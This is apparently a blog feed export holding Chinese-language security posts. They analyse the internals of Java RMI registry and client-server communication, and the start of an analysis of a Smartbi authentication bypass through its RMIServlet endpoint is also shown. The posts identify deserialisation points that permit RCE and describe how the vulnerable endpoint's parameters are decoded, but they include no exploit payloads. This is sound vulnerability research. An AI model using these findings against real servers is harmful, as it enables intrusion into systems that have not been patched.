&#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var66);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>            &#125;<br></code></pre></td></tr></table></figure><p>在这里会对每个调用的方法进行处理，比如你调用了bind方法，就会先readObject反序列化你床哟来的序列化对象，之后再调用<code>var6.bind</code>来注册服务，此时的<code>var6</code>是<code>RegistryImpl</code>对象，这是调用<code>createRegistry</code>获得的。</p><p>到这里我们也就明白了，其实无论是<code>客户端</code>还是<code>服务端</code>，最终调用注册中心的方法都是通过对创建的<code>RegistryImpl</code>对象的调用。通过上面那部分，我们已经分析完了当注册中心监听的端口被请求时，本地是如何处理这些请求的。</p><h3 id="远程获取注册中心"><a href="#远程获取注册中心" class="headerlink" title="远程获取注册中心"></a>远程获取注册中心</h3><p>通过<code>getRegistry</code>方法获得的对象是<code>RegistryImpl_Stub</code>对象，与通过<code>createRegistry</code>获得的对象不同，<code>createRegistry</code>获得的是<code>RegistryImpl</code>对象。</p><p>当我们调用这两者的方法时，其对应的处理方式也十分不同，以bind方法举例，通过createRegistry获得的注册中心调用bind方法十分简单：</p><p><img src="https://ice.frostsky.com/2023/08/22/bf38c474f3b452c4d280ea8cdfac025e.png" alt="image-20230822165156451"></p><p>我的这个JDK版本比较低，在稍微高一点的版本，在bind中首先会进行<code>checkAccess</code>，里面有一些判断，会对你当前的权限，来源IP进行判断，在高版本JDK中不允许除了localhost之外的地址注册服务，也是在这里进行判断的。之后就是判断这个键是否被绑定过，如果被绑定则抛异常，反之则将键和对象值都put到Hashtable中。</p><p>如果是远程调用bind方法，就比较麻烦了。测试伪代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8888</span>);<br><span class="hljs-type">Registry</span> <span class="hljs-variable">reg</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">8888</span>);<br>reg.bind(<span class="hljs-string">&quot;name&quot;</span>,obj)<br></code></pre></td></tr></table></figure><p>这里我先创建了注册中心，之后通过<code>getRegistry</code>的方式远程获取注册中心，此时获得到的对象为<code>RegistryImpl_Stub</code>，跟入其<code>bind</code>方法：</p><p><img src="https://ice.frostsky.com/2023/08/22/088ff2e013a57161c9a63e29cc760854.png" alt="image-20230822170127462"></p><p>首先会调用<code>newCall</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/b1258f00c2992f113eb0e2f28612aa81.png" alt="image-20230822170303837"></p><p>注意这里的<code>var3</code>，前面说过，0对应的是bind方法，此时的var3就代表了bind方法对应的数字。</p><p>在<code>newConnection</code>这里，会写入一些已经约定好的数据，比如ip、端口等，在<code>StreamRemoteCall</code>里，同样会写入一些数据：</p><p><img src="https://ice.frostsky.com/2023/08/22/d998899f7c3e8656c6c9708ca3dae8bf.png" alt="image-20230822170627293"></p><p>这里在最开始写入了80，也就和我们上边分析时说的80对上了，然后还会写一些数据比如要调用的方法所对应的num和ObjID之类的。</p><p>当调用完这些之后，回到bind方法：</p><p><img src="https://ice.frostsky.com/2023/08/22/cee9cd6c9403b31713239bd8e92121b5.png" alt="image-20230822170803058"></p><p>此时会写入两个内容：</p><ul><li>序列化后的<code>var1</code>；<code>var1</code>为我们要绑定远程对象对应的名称</li><li>序列化后的<code>var2</code>；<code>var2</code>为我们要绑定的远程对象</li></ul><p>在<code>invoke</code>这里会把请求发出去，接着我们看看注册中心在收到这条请求后是如何进行处理的，前面说了会调用Skel.dispatch来处理请求，我们直接看这个就可以了。</p><p><img src="https://ice.frostsky.com/2023/08/22/8fa89c502acee602776f65be69d4a756.png" alt="image-20230822163348059"></p><p>注册中心首先会read两个Object，第一个即我们刚刚write进去的字符串对象，第二个就是远程对象了，接着调用<code>var6.bind</code>来绑定服务，<code>var6</code>即<code>RegistryImpl</code>对象，他是如何绑定服务的在上边写了。</p><p>至此，我们已经了解了当注册中心的方法被调用时，远程获取和本地获取的差异是什么。</p><h3 id="客户端与服务端的通信"><a href="#客户端与服务端的通信" class="headerlink" title="客户端与服务端的通信"></a>客户端与服务端的通信</h3><p>客户端与服务端的通信只发生在调用远程方法时。此时是客户端的远程代理对象与的Skel进行通信。</p><p>我们在客户端获取的是注册中心封装好的代理对象，所以默认会调用代理对象的invoke方法：</p><p><img src="https://ice.frostsky.com/2023/08/22/275fe0c0aa0e7778e5e4615266113f1f.png" alt="image-20230822190737766"></p><p>在这里会判断你调用的方法是所有对象都有的，还是只有远程对象才有的，如果是前者，则进入<code>invokeObjectMethod</code>中，后者则进入<code>invokeRemoteMethod</code>中。</p><p>跟入RemoteObjectInvocationHandle.<code>invokeRemoteMethod</code>中：</p><p><img src="https://ice.frostsky.com/2023/08/22/212d78cbaef92f428dc4a68b4c883816.png" alt="image-20230822191142591"></p><p>在这里会调用this.ref.invoke，并把proxy、method、args以及method的hash传过去，this.ref是在lookup时获取到的远程对象绑定的一些端口信息。跟进UnicastRef.<code>invoke</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/965c1bdafb6720c33e1abb54dfe78fb0.png" alt="image-20230822192250289"></p><p>同样的，在newConnection这里会发送一些约定好了的数据。接着在<code>marshaValue</code>这里，会将我们调用的方法、要传递的参数序列化写到连接中，如果传递的参数是对象，就会写入序列化对象到这里：</p><p><img src="https://ice.frostsky.com/2023/08/22/2760ce3fafec7c5457691bafc4eadb52.png" alt="image-20230822192434594"></p><p><img src="https://ice.frostsky.com/2023/08/22/9db8a8e76868723515c6c4f2529cd254.png" alt="image-20230822192608384"></p><p>接着会调用StreamRemoteCall.<code>executeCall</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/a873c1079afe69942f694b99facb08bd.png" alt="image-20230822192852263"></p><p>在this.releaseOutputStream方法中，会读取服务端执行的结果：</p><p><img src="https://ice.frostsky.com/2023/08/22/dce65865b6bd708792bb4e505c6b9b07.png" alt="image-20230822192932757"></p><p>在this.out.flush时，会把之前写进去的数据发出去，服务端会返回执行结果</p><p>在调用完<code>executeCall</code>后，会进入下边这个方法，把数据取出来：</p><p><img src="https://ice.frostsky.com/2023/08/22/cbaeec9ab778702b00e8db09ce989024.png" alt="image-20230822193158889"></p><p>调用了<code>unmarsharValue</code>方法，把数据取出来，用的是jdk自带的readObject：</p><p><img src="https://ice.frostsky.com/2023/08/22/ca31e6155ff4c5f8df5fe0bd450079cf.png" alt="image-20230822193348959"></p><p>至此，我们清楚了客户端是如何和服务端通信的。还有服务端又是如何与客户端进行通信的呢？</p><p>当客户端在与服务端通信时，服务端实际处理请求的位置在：UnicastServerRef.<code>dispatch</code>：</p><p><img src="https://ice.frostsky.com/2023/08/22/0b766de6573b2a12a7c7c4787b5fed90.png" alt="image-20230822194020581"></p><p>在这里会调用<code>unmarshaValue</code>，对请求传来的参数进行处理：</p><p><img src="https://ice.frostsky.com/2023/08/22/695620729bcad38c89ea2bc0fbef8067.png" alt="image-20230822194335117"></p><p><img src="https://ice.frostsky.com/2023/08/22/fed9f7da4227336da7da5a83d6cdddd0.png" alt="image-20230822194354798"></p><p>在这里会判断参数的数据类型，如果是Object的话，则会反序列化，所以在这里我们如果能够找到Server注册的远程对象中，如果某个方法传递的参数类型是Object，在服务端这里会被反序列化，此时即可造成RCE。</p><p><img src="https://ice.frostsky.com/2023/08/22/b54078598bee97a13408fbc92bca4055.png" alt="image-20230822194843997"></p><p>最终通过调用invoke，来调用远程对象的方法。</p><p>至此，我们清楚了这三者之间的通信过程</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>没人比我更懂RMI(上)</title>
    <link href="/2023/08/15/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI/"/>
    <url>/2023/08/15/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html">参考文章1</a></p><p><a href="https://xz.aliyun.com/t/9261">参考文章2</a></p><p><strong>每篇鸡汤：</strong></p><p>万事开头难，当走出第一步你会发现，其实事情并没有你想象的那么糟糕</p><p>文章可能稍微有点长，一定要耐心看完  <strong>o.0</strong></p><h1 id="RMI概念"><a href="#RMI概念" class="headerlink" title="RMI概念"></a>RMI概念</h1><p>本来想把官方对RMI的概念贴在开头的，突然想了想开头就整臭长臭长的文字，谁顶得住。其实总的来说用一句话就可以概括。</p><p>——RMI就是负责远程调用对象的。</p><p>既然提到了远程调用对象，肯定不是调用自己本地的对象。先给大家举个生活中的例子渗透一下概念：</p><p><img src="https://ice.frostsky.com/2023/08/15/d44cd0f578220653df11f321d447754e.jpeg" alt="j"></p><p>比如你在北京上学，你女神在西安，并且你想通过发送信息给女神告白。</p><ol><li><p>你想告白，得通过手机发送信息（相当于调用远程方法;但是调用方法之前会先创建<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>）这个<code>stub</code>就相当于你的手机；也就是说，你并不能直接面对面告诉女神，而手机只是你传递信息的一种媒介，相当于是一个代理。</p></li><li><p>然后你给女神里发了个信息，在你刚呼出的一瞬间，手机会将你的呼出信号交给三大运营商（相当于<code>stub</code>会将<code>Remote</code>对象传递给<code>远程引用层(java.rmi.server.RemoteRef)</code>并创建<code>java.rmi.server.RemoteCall(远程调用)</code>对象。）三大运营商会帮你找到你的女神。</p></li><li><p>运营商在收到你的信号后会将你这个呼出的动作转换成其他形式的信号进行传输（<code>RemoteCall</code>序列化<code>RMI服务名称</code>、<code>Remote</code>对象。）</p></li><li><p>然后运营商通过自己架设的线路进行通信（<code>RMI客户端</code>的<code>远程引用层</code>传输<code>RemoteCall</code>序列化后的请求信息通过<code>Socket</code>连接的方式传输到<code>RMI服务端</code>的<code>远程引用层</code>。）</p></li><li><p>在找到对方之后，对方手机会立刻响铃（<code>RMI服务端</code>的<code>远程引用层(sun.rmi.server.UnicastServerRef)</code>收到请求会请求传递给<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>；这个<code>Skeleton</code>就相当于女神的手机）</p></li><li><p>此时对方手机会将之前用其他形式传输的信号，转变为人能看懂的文字（<code>Skeleton</code>调用<code>RemoteCall</code>反序列化<code>RMI客户端</code>传过来的序列化。）</p></li><li><p>对方查看手机(Skeleton)信息，并用手机给你进行回复：“<strong>你是个好人</strong>”（<code>Skeleton</code>处理客户端请求：<code>bind</code>、<code>list</code>、<code>lookup</code>、<code>rebind</code>、<code>unbind</code>，如果是<code>lookup</code>则查找<code>RMI服务名</code>绑定的接口对象，序列化该对象并通过<code>RemoteCall</code>传输到客户端。）</p></li><li><p>你收到信息，并看到是女神给你的回复，非常激动！（<code>RMI客户端</code>反序列化服务端结果，获取远程对象的引用）</p></li><li><p>你双击信息打开进一步查看内容（<code>RMI客户端</code>调用远程方法，<code>RMI服务端</code>反射调用<code>RMI服务实现类</code>的对应方法并序列化执行结果返回给客户端。）</p></li><li><p>结果看到女神送给你的“好人卡”（<code>RMI客户端</code>反序列化<code>RMI</code>远程方法调用结果。）</p></li></ol><p>在代码实现之前我们还需要明白一个在RMI中扮演着重要角色的<strong>”注册中心“</strong>，他在服务端创建。</p><p>我们知道java远程对象是基于socket来进行传输的，有socket就要有端口。</p><p>举个例子：</p><p>服务端现在有一个名为A的远程对象。现在你是客户端，你并不知道服务端把这个A开放在对应的哪个端口。就算你知道了A的开放端口。服务其上还有B、C、D……..难道你要记住每个远程对象的端口吗？很明显这是不现实的。</p><p>那么这个时候，就要用到我们的注册中心。他的作用就是将自己绑定在服务端的某个端口(默认1099)这样你只需要记住一个端口，他会帮我们记住这100个远程对象对应的开放端口。当客户端进行调用的时候，只需要告诉注册中心，我要找A，那么注册中心就会告诉你A所对应的端口。有点像交换机和路由器的原理。</p><p>在了解这个重要概念以后，我们再来接着往下看RMI具体是如何实现的。</p><p>RMI具体代码实现如下：</p><p><strong>服务端代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-comment">//这个接口定义着你都能调用服务端的什么方法。需要抛出 RemoteException</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;<br>        <span class="hljs-comment">//UnicastRemoteObject.exportObject(this,0);  //如果不继承UnicastRemoteObject就需要手动导出</span><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>(); <span class="hljs-comment">//创建远程对象</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>); <span class="hljs-comment">//创建注册中心</span><br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>,remoteObj); <span class="hljs-comment">//绑定远程对象</span><br>        System.out.println(<span class="hljs-string">&quot;server is OK&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>客户端代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    是不是有点眼熟，你可能会有疑问：为什么客户端还要创建一个和服务端相同的接口？</span><br><span class="hljs-comment">    通过共享接口定义，RMI 框架能够在编译时进行类型检查，确保方法调用的正确性。同时，RMI 框架能够自动生成代理对象和存根对象，它们负责处理远程方法的序列化、网络传输和反序列化等细节。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;<br><span class="hljs-comment">//写法一：</span><br>        <span class="hljs-comment">//获取注册中心</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;192.168.56.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//查找远程对象 </span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        <span class="hljs-comment">//调用远程方法</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(out);<br><span class="hljs-comment">//写法二：</span><br>        <span class="hljs-comment">//直接查找远程对象</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj1</span> <span class="hljs-operator">=</span> (IRemoteObj) Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1088/remoteObj&quot;</span>);<br>        <span class="hljs-comment">//调用远程方法</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">out1</span> <span class="hljs-operator">=</span> remoteObj1.sayHello(<span class="hljs-string">&quot;hi&quot;</span>);<br>        System.out.println(out1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先在服务端创建远程对象的时候”<code>IRemoteObj remoteObj = new RemoteObjImpl();</code>“这一句代码，我们来分析一下他都干了什么</p><ol><li>因为我们继承了<code>UnicastRemoteObject()</code>，所以首先会来到他父类的构造方法处并进行赋值<code>0</code>。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/ac810643b3fee5dc0b634589aead9868.png" alt="i"></p><ol start="2"><li>随后会将传入的参数赋值给<code>port</code>，相当于给<code>port</code>传入默认值0，如果传入0后续会将远程对象发布在随机的端口上。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/a0bf10379a9a2c7243d62ec37bc3dfbc.png" alt="image-20230816183938605"></p><ol start="3"><li>这也就是是我们之前代码中如果继承了这个类就不需要再次调用，如果不继承则需要手动调用</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/29b6168e6a25f50276a83be349bb112a.png" alt="image-20230816184413215"></p><ol start="4"><li>跟进<code>UnicastServerRef()</code></li></ol><p><img src="https://ice.frostsky.com/2023/08/16/14e6eaa1fe4227e4f3042388bcaa4226.png" alt="image-20230816184541021"></p><ol start="5"><li>在进行跟进<code>LiveRef()</code>因为他会调用他的构造方法，所以我们直接看构造方法</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/fb7ffb82e926159f612ee86b09fe1375.png" alt="image-20230816184721936"></p><p>第一个参数和最后一个参数很好理解，中间的这个参数是什么呢？我们还需要再次跟进</p><ol start="6"><li>我们可以看到它的返回值是<code>TCPEndpoint</code>所以很明显这里是处理网络请求的类。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/5d354ed0a490a196835a99760736c99f.png" alt="image-20230816184834796"></p><ol start="7"><li>跟进发现，接收两个参数一个<code>host</code>一个<code>port</code>。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/87491f64fb83fabec9a3550f3db294f0.png" alt="image-20230816184951738"></p><ol start="8"><li>然后我们跟到<code>LiveRef</code>发现他恰好就接收这三个参数，而且从下方参数信息也可以看到它接收到了对应的参数。到这一直是封装封装。而真正处理网络请求的就是<code>TCPTransport</code>，并最后将的结果放入<code>LiveRef</code></li></ol><p><img src="https://ice.frostsky.com/2023/08/16/a7d643ca12ae591e5a2d5ce162bcb082.png" alt="image-20230816185301173"></p><ol start="9"><li>之后会创建代理，细心的同学已经发现了，为什么服务端创建了stub？stub不是客户端的代理吗？</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/40270ac31d21024b22b7533f89cae7cf.png" alt="image-20230816185657657"></p><p>​解答：stub是客户端的代理没错，但是客户端是通过stub来进行远程调用的。他整个的流程是先在服务端创建好stub，然后放在注册中心，客户端创建stub，然后去注册中心找对应的server端stub，找到以后再用server端的stub来操作server端Skeletion。</p><ol start="10"><li>之后会创建他的类加载器、接口、调用处理器，而调用处理器里面的值还是之前的<code>LiveRef</code></li></ol><p><img src="https://ice.frostsky.com/2023/08/16/fe5daee7dd081ca4b65dd0297a57d198.md.png" alt="image-20230816190430758"></p><ol start="11"><li>可以看到这里已经把stub的端口从之前的初始值<code>0</code>变成了随机的端口，发布在注册中心，并记录server端。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/fb5c313152ecffdc3d726a96ffbac350.png" alt="image-20230816190840205"></p><p>这里只是简单的跟一下服务端原创对象的创建过程，让大家清楚的看到，服务端在创建对象的时候，实际上都干了什么。具体细节感兴趣的同学可以自己跟一下。</p><p>接下来我们再跟一下创建注册中心<code>Registry r = LocateRegistry.createRegistry(1099);</code>看看他都干了什么</p><ol><li>创建注册中心，接收参数端口。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/35ca1e4c504ccb3eb11842cefa3693b9.png" alt="image-20230816191650239"></p><ol start="2"><li>跟进，发现底层创建了<code>LiveRef</code>和<code>UnicastServerRef</code>。服务端创建原创对象的时候也是这样的操作。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/990672b5cf8abcf482fd1ef484876b7c.md.png" alt="image-20230816191957806"></p><ol start="3"><li>唯一的不同是他创建的这个远程对象是永久的远程对象，而我们之前自定义的远程对象是一个临时的对象。可以看到，后面还是在服务端创建stub给客户端来进行调用。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/8fa59bb843382c455bc289ea9961bef8.png" alt="image-20230816192249999"></p><ol start="4"><li>可以看到注册中心创建的stub他是由<code>froname</code>创建的，之前创建远程对象的stub实际上是靠动态代理的调用处理器创建的。他们两个的创建方式不一样。</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/0a8a68872348aa8a648b486dd8d3fab3.png" alt="image-20230816192630687"></p><ol start="5"><li>之后会将创建好的远程对象放进<code>table</code>当中</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/13e97abbaaae5931552e813f3869daaf.md.png" alt="image-20230816193458856"></p><p>然后服务端最后一步将远程对象绑定在注册中心这一步比较简单，我们就不跟了。(不是我懒，是今天天气不好，不适合调试)</p><p>至此我们把服务端整个RMI的流程简单分析了一遍，现在大家都应该清楚他们每一步到底干了什么。</p><h1 id="RMI反序列化"><a href="#RMI反序列化" class="headerlink" title="RMI反序列化"></a>RMI反序列化</h1><p>从RMI设计角度来讲，基本分为三层架构模式来实现RMI，分别为<strong>RMI服务端</strong>，<strong>RMI客户端</strong>和<strong>RMI注册中心</strong>，如下图所示。</p><p><img src="https://ice.frostsky.com/2023/08/16/df88fdc4cd57d758745a70045e5a1e02.md.png" alt="image-20230816182716313"></p><p>他们之间可以相互两两通信。由于RMI在网络传输数据是需要对数据进行序列化和反序列化的。那么这个时候我们其实就可以利用他反序列化从而进行利用。</p><p>这里先提一嘴，我下一篇文章在出利用吧，主要不是我懒，是我怕文章太长，使得大家阅读枯燥无味。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi内置用户绕过浅析</title>
    <link href="/2023/07/21/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/"/>
    <url>/2023/07/21/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>​       Smartbi是一款国内领先的商业智能可视化报表工具，它可以将数据转化为图表、图像、表格等形式，帮助企业快速发现数据背后的价值，优化决策，提高业务效率。在众多可视化报表工具中，Smartbi以高效、易用、灵活等特点著称。</p><p>​       在对目标站点发起请求时，后台会判断我们的请求路径是否为：<code>&quot;/vision/RMIServlet&quot;</code>，如果路径正确才会接收对应的参数，若路径不正确则不会接收。</p><p>​       他一共有<strong>三种</strong>接收参数的方式</p><p>​       <strong>第一种</strong>是如下图用<code>windowUnloading</code>的方式传入，接收以后先进行<code>URLDecode</code>再用内置的<code>RMICoder.decode()</code>进行解码，之后分别赋值给<code>className</code>、<code>methodName</code>和<code>params</code>。</p><p><img src="https://ice.frostsky.com/2023/08/15/5e4ad34a2a514cd6344809c2c6cf8f77.png" alt="1"></p><p>​       <strong>第二种</strong>接收参数的方式是直接用POST传入，先接收<code>className</code>和<code>methodName</code>两个变量，最后在doPost中接收<code>params</code>。</p><p><img src="https://ice.frostsky.com/2023/08/15/5152b017abe11bafdb1029775821fc0f.png" alt="2"></p><p>​       <strong>第三种</strong>接收参数的方式是用<code>encode</code>传入这种传入方式和第一种的<code>windowUnloading</code>有许多相似之处。</p><p><img src="https://ice.frostsky.com/2023/08/15/c32ef627aabd3ffa43a2dd36a1a6d388.png" alt="3"></p><p>​       看了接收参数的方式之后，我们来分析一下他们产生漏洞的原因。我们着重讲解第一种以<code>windowUnloading</code>方式传入。因为他们只是传参方式不同，到最后利用点都是一样的。</p><p><img src="https://ice.frostsky.com/2023/08/15/9c2568fe8547f55d8318d2afc7317cfb.png" alt="img"></p><p>​       通过上面的代码可以看到用<code>windowUnloading</code>接收到参数后会将<code>content</code>进行<code>RMICoder.decode()</code>其实最重要的也就是这一步，因为这一步会将我们输入的参数进行解码，那我们要传入参数的话必须得知道他是如何进行编码（顺带提一嘴，<code>RMICoder.decode()</code>和<code>RMICoder.encode()</code>方法是不对称的，所以没办法直接进行还原）所以我们深入一下<code>RMICoder.decode()</code>。</p><p><img src="https://ice.frostsky.com/2023/08/15/bc592e6c68e6d670897d027bd8b3be37.png" alt="img"></p><p>​       再看一下<code>CodeHandler.enCode()</code>和<code>CodeHandler.deCode()</code>，除了上面<strong>存</strong>和<strong>取</strong>的方式不同，暂时还是没有明显区别。</p><p><img src="https://ice.frostsky.com/2023/08/15/5434c63bcc9232c97370989436277eb0.png" alt="img"></p><p>​       再往里面进<code>getSystemCoder()</code>：</p><p><img src="https://ice.frostsky.com/2023/08/15/30a7e8ef0681ec62d46cb1a58e8bf39e.png" alt="img"></p><p>​       这段代码是一个静态方法，用于获取系统编码器（ICoder对象）。</p><p>​       首先，定义了一个字符串变量algorithName，并将其初始化为null。</p><p>​       